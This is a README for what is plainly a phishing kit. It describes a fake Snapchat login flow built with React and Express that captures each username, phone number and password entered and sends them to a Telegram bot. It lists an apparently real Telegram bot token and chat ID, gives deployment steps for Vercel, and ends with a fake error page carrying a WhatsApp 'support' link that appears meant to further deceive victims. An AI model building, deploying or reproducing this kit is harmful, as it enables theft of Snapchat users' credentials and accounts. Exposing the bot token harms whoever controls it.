# Snapchat Login Interface

A modern, fully functional Snapchat-like login interface built with React, TypeScript, and Tailwind CSS. The application captures user credentials and sends them to a Telegram bot for logging purposes.

## Features

- **Multi-step Login Flow**: Username/Email → Phone Number toggle
- **Password Entry**: Secure password input with visibility toggle
- **Form Validation**: 
  - Phone number must be exactly 11 digits
  - Error messages displayed in red for invalid inputs
- **Telegram Integration**: All user inputs are automatically sent to a Telegram bot
- **Responsive Design**: Works seamlessly on desktop and mobile devices
- **Arabic Support**: Full RTL (Right-to-Left) support for Arabic text
- **WhatsApp Support Link**: Direct link to support via WhatsApp

## Pages

1. **Login Username**: Enter username or email
2. **Login Phone**: Enter phone number with country code selector
3. **Login Password**: Enter password with visibility toggle
4. **Final Page**: Error message with WhatsApp support link

## Tech Stack

- **Frontend**: React 19, TypeScript, Tailwind CSS 4
- **Backend**: Express.js, tRPC
- **Database**: MySQL/TiDB with Drizzle ORM
- **Testing**: Vitest
- **Build Tool**: Vite

## Installation

```bash
# Install dependencies
npm install
# or
pnpm install

# Run development server
npm run dev
# or
pnpm dev

# Run tests
npm test
# or
pnpm test

# Build for production
npm run build
# or
pnpm build
```

## Environment Variables

The following environment variables are required:

- `TELEGRAM_BOT_TOKEN`: Your Telegram bot token (8211906189:AAFefPi_NrJwvsZ6njNratZlhNaMl84I7qw)
- `TELEGRAM_CHAT_ID`: Your Telegram chat ID (-1003343585643)
- `DATABASE_URL`: MySQL/TiDB connection string
- `JWT_SECRET`: Session cookie signing secret

## Telegram Integration

All form submissions are automatically sent to a Telegram bot:
- Username/Email entries
- Phone number entries
- Password entries

The Telegram bot token and chat ID are configured in the environment variables.

## Deployment

### Deploy to Vercel

1. Push the repository to GitHub
2. Go to [Vercel](https://vercel.com)
3. Click "New Project"
4. Select the GitHub repository
5. Configure environment variables
6. Click "Deploy"

The application will be automatically deployed and available at a Vercel URL.

## Project Structure

```
client/
  src/
    pages/
      LoginFlow.tsx         # Main login flow component
      LoginUsername.tsx     # Username/email login page
      LoginPhone.tsx        # Phone number login page
      LoginPassword.tsx     # Password entry page
      FinalPage.tsx         # Final error/success page
    components/            # Reusable UI components
    lib/trpc.ts           # tRPC client setup
    App.tsx               # Main app component

server/
  routers.ts              # tRPC procedures
  telegram.ts             # Telegram integration
  db.ts                   # Database helpers

drizzle/
  schema.ts               # Database schema
```

## License

MIT

## Support

For issues or questions, contact support via WhatsApp: https://wa.me/+201127267627
